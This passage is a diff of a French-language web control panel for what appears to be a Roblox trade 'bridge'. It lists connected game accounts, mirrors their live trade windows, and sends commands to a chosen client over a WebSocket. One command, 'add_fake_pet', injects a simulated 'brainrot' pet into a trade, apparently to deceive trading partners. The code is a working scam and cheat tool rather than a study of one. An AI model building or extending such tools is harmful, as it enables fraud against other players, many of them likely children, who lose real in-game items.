+            <i data-lucide="monitor-off" class="w-8 h-8 mx-auto mb-2 text-slate-300"></i>
+            Aucun compte connecté au pont...
+          </div>
+        `;
+        lucide.createIcons();
+        return;
+      }
+
+      listContainer.innerHTML = '';
+      connectedPlayers.forEach(player => {
+        const isSelected = player.id === selectedClientId;
+        const uniqueImgId = `img-user-${player.id}`;
+        const tradeStatusText = player.tradeInfo.inTrade ? 'Dans un trade' : 'Au lobby';
+        const tradeStatusClass = player.tradeInfo.inTrade 
+          ? 'bg-emerald-50 border-emerald-100 text-emerald-700' 
+          : 'bg-slate-100 border-slate-200 text-slate-500';
+
+        const item = document.createElement('div');
+        item.className = `p-4 rounded-xl border flex items-center justify-between cursor-pointer transition-all duration-200 ${
+          isSelected 
+            ? 'bg-emerald-50 border-emerald-400/80 shadow-md shadow-emerald-500/5' 
+            : 'bg-white border-slate-200 hover:bg-slate-50'
+        }`;
+        
+        item.onclick = () => selectPlayer(player.id);
+        
+        item.innerHTML = `
+          <div class="flex items-center space-x-3">
+            <img id="${uniqueImgId}" src="" class="w-10 h-10 rounded-full border border-slate-200 bg-slate-50" alt="Avatar">
+            <div>
+              <p class="font-bold text-sm text-slate-900">${player.playerInfo.displayName}</p>
+              <p class="text-xs text-slate-400 font-semibold">@${player.playerInfo.username}</p>
+            </div>
+          </div>
+          <span class="px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border ${tradeStatusClass}">
+            ${tradeStatusText}
+          </span>
+        `;
+        listContainer.appendChild(item);
+        
+        // Charger l'avatar de manière asynchrone
+        loadAvatar(player.playerInfo.userId, uniqueImgId);
+      });
+    }
+
+    // Sélectionner un joueur
+    function selectPlayer(clientId) {
+      selectedClientId = clientId;
+      renderPlayersList();
+      const player = connectedPlayers.find(p => p.id === clientId);
+      if (player) {
+        const serverList = player.playerInfo.animalsList;
+        availableAnimals = (serverList && serverList.length > 0) ? serverList : FALLBACK_ANIMALS;
+        document.getElementById('no-selected-user').classList.add('hidden');
+        document.getElementById('control-panel').classList.remove('hidden');
+        updateControlPanel(player);
+      }
+    }
+
+    // Mettre à jour l'écran de contrôle du joueur ciblé
+    function updateControlPanel(player) {
+      // Charger la photo de profil robuste
+      loadAvatar(player.playerInfo.userId, 'target-avatar');
+      
+      document.getElementById('target-display-name').innerText = player.playerInfo.displayName;
+      document.getElementById('target-username').innerText = `@${player.playerInfo.username}`;
+      document.getElementById('target-client-id').innerText = player.id;
+
+      const badge = document.getElementById('target-trade-badge');
+      const warning = document.getElementById('not-in-trade-warning');
+      const controls = document.getElementById('trade-controls');
+
+      if (player.tradeInfo.inTrade) {
+        const cleanOther = (player.tradeInfo.otherPlayer || 'INCONNU').replace(/'[Ss]\s?[Oo][Ff][Ff][Ee][Rr]$/g, '').replace(/'[Ss]\s?Offer$/g, '').trim();
+        badge.innerText = `DANS UN ÉCHANGE AVEC ${cleanOther}`;
+        badge.className = "px-3 py-1.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider bg-emerald-50 border border-emerald-200 text-emerald-700";
+        warning.classList.add('hidden');
+        controls.classList.remove('hidden');
+
+        // Mettre à jour l'affichage des Ready states de l'échange
+        updateReadyStateBox('your', player.tradeInfo.isYourReady);
+        updateReadyStateBox('other', player.tradeInfo.isOtherReady);
+        
+        // Mettre à jour la réplique visuelle du trade Roblox !
+        document.getElementById('your-offer-count').innerText = `${player.tradeInfo.yourOffer ? player.tradeInfo.yourOffer.length : 0}/16 slots`;
+        const otherNameClean = (player.tradeInfo.otherPlayer || 'OTHER').replace(/'[Ss]\s?[Oo][Ff][Ff][Ee][Rr]$/g, '').replace(/'[Ss]\s?Offer$/g, '').trim();
+        document.getElementById('other-offer-title').innerText = `${otherNameClean}'S OFFER`;
+        document.getElementById('other-offer-count').innerText = `${player.tradeInfo.otherOffer ? player.tradeInfo.otherOffer.length : 0}/16 slots`;
+        
+        renderOfferItems('your-offer-items', player.tradeInfo.yourOffer, false);
+        renderOfferItems('other-offer-items', player.tradeInfo.otherOffer, true);
+      } else {
+        badge.innerText = "HORS ÉCHANGE";
+        badge.className = "px-3 py-1.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider bg-slate-50 border border-slate-200 text-slate-500";
+        warning.classList.remove('hidden');
+        controls.classList.add('hidden');
+      }
+    }
+
+    // Mettre à jour visuellement les cartes de Ready
+    function updateReadyStateBox(type, isReady) {
+      const box = document.getElementById(`${type}-ready-box`);
+      const txt = document.getElementById(`${type}-ready-text`);
+      const iconBox = document.getElementById(`${type}-ready-icon-box`);
+
+      if (isReady) {
+        box.className = "bg-emerald-50 border border-emerald-200 p-2 rounded-xl flex items-center justify-between transition-all duration-200 mb-2";
+        txt.innerText = "PRÊT !";
+        txt.className = "text-xs font-extrabold text-emerald-700";
+        iconBox.className = "p-1.5 rounded-lg bg-emerald-100 text-emerald-700";
+        iconBox.innerHTML = '<i data-lucide="check" class="w-3 h-3"></i>';
+      } else {
+        box.className = "bg-slate-50 border border-slate-100 p-2 rounded-xl flex items-center justify-between transition-all duration-200 mb-2";
+        txt.innerText = "EN ATTENTE";
+        txt.className = "text-xs font-extrabold text-slate-400";
+        iconBox.className = "p-1.5 rounded-lg bg-slate-200/50 text-slate-400";
+        iconBox.innerHTML = '<i data-lucide="clock" class="w-3 h-3"></i>';
+      }
+      lucide.createIcons();
+    }
+
+    // Envoyer une action à un client ciblé
+    function sendCommand(action, details = {}) {
+      if (!selectedClientId) return;
+      ws.send(JSON.stringify({
+        targetClientId: selectedClientId,
+        action: action,
+        ...details
+      }));
+    }
+
+    // Échapper les caractères spéciaux pour éviter de casser le HTML inline
+    function escapeHtml(str) {
+      return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+    }
+
+    // ÉCOUTEURS D'ÉVÉNEMENTS DES BOUTONS DE CONTRÔLE
+
+    // Ajouter un brainrot simulé
+    document.getElementById('btn-add-pet').onclick = () => {
+      const petName = document.getElementById('pet-name').value;
+      const petMutation = document.getElementById('pet-mutation').value;
+      if (!petName) {
+        alert("Veuillez saisir ou sélectionner un animal.");
+        return;
+      }
+      sendCommand('add_fake_pet', { petName, petMutation });
+      
+      const btn = document.getElementById('btn-add-pet');
+      btn.innerText = "COMMANDE TRANSMISE !";
+      setTimeout(() => {
+        btn.innerText = "ADD BRAINROT";
+      }, 1000);
+    };
+
+  </script>
+</body>
+</html>
